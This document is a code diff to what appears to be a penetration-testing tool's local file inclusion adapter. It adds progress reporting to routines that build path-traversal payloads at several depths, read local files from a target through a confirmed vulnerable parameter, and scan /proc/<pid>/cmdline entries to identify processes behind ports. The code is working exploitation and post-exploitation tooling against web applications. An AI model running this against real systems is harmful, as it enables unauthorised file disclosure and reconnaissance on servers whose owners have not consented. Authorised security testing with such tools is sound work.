@@ -220,6 +220,7 @@ async def _scan_pid_cmdlines(
     depth: int,
     ports: list[int],
     pid_max: int,
+    progress_cb=None,
 ) -> list[dict]:
     import asyncio
     import httpx
@@ -261,10 +262,15 @@ async def _scan_pid_cmdlines(
     async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=timeout, limits=limits) as pid_client:
         for start in range(1, pid_max + 1, batch_size):
             stop = min(start + batch_size, pid_max + 1)
+            if progress_cb:
+                await progress_cb(f"    [pid] scanning /proc/{start}..{stop - 1}/cmdline")
             tasks = [asyncio.create_task(check_pid(pid)) for pid in range(start, stop)]
             for task in asyncio.as_completed(tasks):
                 result = await task
                 if result:
+                    if progress_cb:
+                        ports_found = ", ".join(str(port) for port in result.get("matched_ports", []))
+                        await progress_cb(f"    [+] process clue found in /{result['path']} for port {ports_found}")
                     hits.append(result)
                     for pending in tasks:
                         if not pending.done():
@@ -334,6 +340,7 @@ async def _followup_file_reads(
     first_finding: dict,
     headers: dict,
     extra_paths: list[str] | None,
+    progress_cb=None,
 ):
     import httpx
 
@@ -355,6 +362,8 @@ async def _followup_file_reads(
             for path in candidates:
                 if any(item.get("path") == path for item in out):
                     continue
+                if progress_cb:
+                    await progress_cb(f"    [read] trying /{path}")
                 found = None
                 for d in dict.fromkeys([depth, 4, 6, 8, 10]):
                     payload = "../" * d + path
@@ -373,6 +382,8 @@ async def _followup_file_reads(
                             "content": resp.text,
                             "snippet": _clean_snippet(resp.text),
                         }
+                        if progress_cb:
+                            await progress_cb(f"    [+] /{path} readable via depth {d}")
                         break
                 if found:
                     new_reads.append(found)
@@ -565,8 +576,22 @@ class LfiAdapter(ToolAdapter):
         for f in findings:
             yield {"_raw": True, "line": f"  [+] {f['parameter']} via {f['technique']} — {f['payload']}"}
 
+        async def emit(line: str):
+            await progress_queue.put({"event": "raw", "line": line})
+
+        yield {"_raw": True, "line": "  Post-confirm enumeration: reading useful local files with the working payload"}
         process_hits = []
-        followups = await _followup_file_reads(url, findings[0], headers, extra)
+        followups_task = asyncio.create_task(_followup_file_reads(url, findings[0], headers, extra, progress_cb=emit))
+        while True:
+            if followups_task.done() and progress_queue.empty():
+                break
+            try:
+                event = await asyncio.wait_for(progress_queue.get(), timeout=0.25)
+            except asyncio.TimeoutError:
+                continue
+            if event.get("event") == "raw":
+                yield {"_raw": True, "line": event.get("line", "")}
+        followups = await followups_task
         if followups:
             yield {"_raw": True, "line": "  Post-confirm file reads:"}
             for item in followups:
@@ -591,7 +616,26 @@ class LfiAdapter(ToolAdapter):
                         f"{', '.join(str(port) for port in ports)}"
                     ),
                 }
-                process_hits = await _scan_pid_cmdlines(url, findings[0]["parameter"], headers, "", _depth_from_payload(findings[0].get("payload", "")), ports, pid_max)
+                process_task = asyncio.create_task(_scan_pid_cmdlines(
+                    url,
+                    findings[0]["parameter"],
+                    headers,
+                    "",
+                    _depth_from_payload(findings[0].get("payload", "")),
+                    ports,
+                    pid_max,
+                    progress_cb=emit,
+                ))
+                while True:
+                    if process_task.done() and progress_queue.empty():
+                        break
+                    try:
+                        event = await asyncio.wait_for(progress_queue.get(), timeout=0.25)
+                    except asyncio.TimeoutError:
+                        continue
+                    if event.get("event") == "raw":
+                        yield {"_raw": True, "line": event.get("line", "")}
+                process_hits = await process_task
                 if process_hits:
                     yield {"_raw": True, "line": "  Process clues:"}
                     for hit in process_hits:
